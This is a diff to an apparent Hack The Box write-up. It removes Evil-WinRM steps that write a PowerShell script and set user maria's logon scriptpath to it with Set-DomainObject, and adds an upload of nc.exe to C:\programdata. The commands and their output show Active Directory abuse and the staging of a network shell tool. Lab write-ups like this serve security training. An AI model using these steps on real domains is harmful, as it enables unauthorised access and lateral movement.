@@ -435,15 +435,13 @@ A targeted kerberoast attack does not work and shadow credentials dont either
 # Accessing `maria` home directory
 
 ```python
-*Evil-WinRM* PS C:\programdata> echo 'dir C:\Users\maria\ > C:\programdata\content' > maria.ps1
-*Evil-WinRM* PS C:\programdata> type maria.ps1
-dir C:\Users\maria\ > C:\programdata\content
+*Evil-WinRM* PS C:\programdata> upload nc.exe
+                                        
+Info: Uploading /home/kali/htb/object/nc.exe to C:\programdata\nc.exe
+                                        
+Data: 79188 bytes of 79188 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\programdata> 
 ```
-
-```python
-*Evil-WinRM* PS C:\Users\smith\Documents> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\maria.ps1"}
-```
-
-```python
-
-```
+First ill upload `nc.exe`
